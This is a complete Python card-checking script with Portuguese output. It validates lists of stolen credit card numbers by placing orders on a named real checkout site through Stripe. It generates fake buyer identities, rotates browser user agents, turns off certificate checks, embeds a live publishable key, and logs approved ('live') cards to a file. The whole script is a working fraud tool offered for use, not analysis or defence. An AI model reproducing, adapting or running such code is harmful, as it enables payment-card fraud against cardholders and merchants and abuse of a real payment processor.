import subprocess
import sys
import os

REQUIRED = ["requests", "urllib3", "faker", "beautifulsoup4"]

def _ensure_deps():
    marker = ".installed"
    if os.path.isfile(marker):
        return
    missing = []
    for pkg in REQUIRED:
        mod = pkg.replace("-", "_")
        if mod == "beautifulsoup4":
            mod = "bs4"
        try:
            __import__(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[*] Instalando dependencias: {', '.join(missing)}")
        try:
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                "--quiet", "--disable-pip-version-check", *missing
            ])
        except subprocess.CalledProcessError as e:
            print(f"[!] Falha ao instalar: {e}")
            print(f"[!] Rode manualmente: pip install {' '.join(missing)}")
            sys.exit(1)
    try:
        with open(marker, "w") as f:
            f.write("ok")
    except Exception:
        pass

_ensure_deps()

import re
import time
import json
import uuid
import random
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, unquote
from faker import Faker

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake = Faker("pt_BR")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
]


def parse_card(raw):
    raw = raw.strip()
    if not raw:
        return None
    parts = [p.strip() for p in raw.split("|")]
    if len(parts) != 4:
        return None
    card, mm, yyyy, cvv = parts
    if not card.isdigit() or len(card) < 13 or len(card) > 19:
        return None
    if not mm.isdigit() or not (1 <= int(mm) <= 12):
        return None
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return None
    mm = mm.zfill(2)
    if not yyyy.isdigit():
        return None
    if len(yyyy) == 2:
        yyyy = "20" + yyyy
    elif len(yyyy) != 4:
        return None
    return {"card": card, "mm": mm, "yyyy": yyyy, "yy": yyyy[2:], "cvv": cvv,
            "display": f"{card}|{mm}|{yyyy}|{cvv}"}


def gen_buyer():
    first = fake.first_name()
    last = fake.last_name()
    name = f"{first} {last}"
    email = f"{first.lower()}.{last.lower()}{random.randint(10, 9999)}@gmail.com"
    whatsapp = f"({random.randint(11, 99)}) 9{random.randint(10000, 99999)}-{random.randint(1000, 9999)}"
    return name, email, whatsapp


def create_order(s, name, email, whatsapp):
    r = s.post(
        "https://checkout.ferramentasguru.com/",
        data={"plan_id": "1", "name": name, "email": email,
              "whatsapp": whatsapp, "payment_method": "card"},
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://checkout.ferramentasguru.com",
            "Referer": "https://checkout.ferramentasguru.com/",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
        },
        allow_redirects=True,
    )
    if r.status_code != 200:
        return None
    qs = parse_qs(urlparse(r.url).query)
    get = lambda k: (qs.get(k) or [""])[0]
    order = {
        "url_full": r.url,
        "pedido": get("pedido"),
        "plan_id": get("plan_id") or "1",
        "txid": get("txid"),
        "name": unquote(get("name")).replace("+", " "),
        "email": unquote(get("email")),
        "whatsapp": unquote(get("whatsapp")),
    }
    if not order["txid"]:
        return None
    return order


def stripe_create_payment_method(cc, ua, client_session_id):
    r = requests.post(
        "https://api.stripe.com/v1/payment_methods",
        headers={
            "host": "api.stripe.com",
            "user-agent": ua,
            "accept": "application/json",
            "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        },
        data={
            "type": "card",
            "card[number]": cc["card"],
            "card[cvc]": cc["cvv"],
            "card[exp_month]": cc["mm"],
            "card[exp_year]": cc["yy"],
            "guid": "NA",
            "muid": "NA",
            "sid": "NA",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/85e5c00324; stripe-js-v3/85e5c00324; split-card-element",
            "referrer": "https://checkout.ferramentasguru.com/",
            "time_on_page": str(random.randint(10000, 800000)),
            "client_attribution_metadata[client_session_id]": client_session_id,
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "split-card-element",
            "client_attribution_metadata[merchant_integration_version]": "2017",
            "client_attribution_metadata[wallet_config_id]": "3ca1b1af-b1c4-46b7-af55-acfcc05f89cf",
            "key": "pk_live_51RSTezAt7mRmYVFHoWvWCGFLvK9uLfsYJoyVgndvnD5LOKROJ1hRq7xwUA433ooF11UTlSc4VrcBzWHBTLcZYwaT00q3dtVysu",
            "_stripe_version": "2026-03-25.dahlia",
        },
        timeout=30,
        verify=False,
    )
    if r.status_code != 200:
        return None
    return r.json().get("id")


def process_stripe_payment(s, order, pm_id):
    return s.post(
        "https://checkout.ferramentasguru.com/",
        json={
            "action": "process_stripe_payment",
            "payment_method_id": pm_id,
            "payment_intent_id": order["txid"],
            "pedido": order["pedido"],
            "name": order["name"],
            "email": order["email"],
            "whatsapp": order["whatsapp"],
            "plan_id": order["plan_id"],
        },
        headers={
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://checkout.ferramentasguru.com",
            "Referer": order["url_full"],
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=4",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
        },
    )


def parse_response(text):
    if not text:
        return (None, None)
    try:
        j = json.loads(text)
    except Exception:
        return (None, text[:300])
    if isinstance(j, dict):
        err = j.get("error") or j.get("message") or j.get("erro")
        if err:
            return ("success", err) if "expired" in str(err).lower() else ("error", err)
        if "success" in j:
            if j["success"]:
                return ("success", j.get("message") or j.get("msg") or "Aprovada")
            return ("error", j.get("error") or "Reprovada")
        for k in ("message", "msg", "status"):
            v = j.get(k)
            if isinstance(v, str) and v:
                return ("info", v)
        return ("info", json.dumps(j)[:300])
    return ("info", str(j)[:300])


def run_check(cc):
    ua = random.choice(USER_AGENTS)
    client_session_id = str(uuid.uuid4())
    name, email, whatsapp = gen_buyer()

    s = requests.Session()
    s.headers.update({
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    })
    s.verify = False

    order = create_order(s, name, email, whatsapp)
    if not order:
        return ("Reprovada", "nao foi possivel criar pedido")

    pm_id = stripe_create_payment_method(cc, ua, client_session_id)
    if not pm_id:
        return ("Reprovada", "Stripe rejeitou o cartao (BIN NOT SUPPORTED)")

    r2 = process_stripe_payment(s, order, pm_id)
    if not r2:
        return ("Reprovada", "falha no endpoint")

    tipo, msg = parse_response(r2.text)
    if not msg:
        return ("Reprovada", "sem mensagem")
    return ("Aprovada" if tipo == "success" else "Reprovada", msg)


def main():
    print("Checki Stripe para geges")

    cards = []
    if os.path.isfile("db.txt"):
        try:
            with open("db.txt", "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        cc = parse_card(line)
                        if cc:
                            cards.append(cc)
        except Exception as e:
            print(f"[!] Erro lendo db.txt: {e}")

    if not cards:
        while True:
            try:
                raw = input("cc » ").strip()
            except (EOFError, KeyboardInterrupt):
                sys.exit(0)
            if not raw:
                sys.exit(0)
            cc = parse_card(raw)
            if cc:
                cards.append(cc)
                break
            print("[!] Formato invalido.")

    for cc in cards:
        started = time.time()
        try:
            status, msg = run_check(cc)
        except Exception as e:
            status, msg = "Reprovada", f"erro: {e}"
        elapsed = time.time() - started
        line = f"{status} » {cc['display']} » {msg} - {elapsed:.0f}s » @OverThinkingHer"
        print(line)

        if status == "Aprovada":
            try:
                with open("Lives.txt", "a", encoding="utf-8") as f:
                    f.write(f"{cc['display']} » {msg} » @OverThinkingHer\n")
            except Exception as e:
                print(f"[!] Erro salvando em Lives.txt: {e}")


if __name__ == "__main__":
    main()